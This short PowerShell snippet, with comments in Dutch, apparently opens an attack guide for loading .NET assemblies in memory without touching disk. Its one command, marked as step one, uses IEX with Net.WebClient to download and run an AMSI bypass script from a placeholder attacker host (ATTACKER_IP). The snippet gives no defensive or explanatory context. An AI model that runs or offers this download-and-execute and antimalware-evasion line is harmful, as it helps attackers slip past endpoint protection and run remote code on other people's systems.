# In-Memory .NET laden via PowerShell (Assembly.Load)
# Geen bestand op schijf - assembly direct in geheugen van huidig PS-proces

# === Stap 1: AMSI bypass (eerst uitvoeren) ===
IEX (New-Object Net.WebClient).downloadString('http://ATTACKER_IP/payloads/amsi-bypass.ps1')

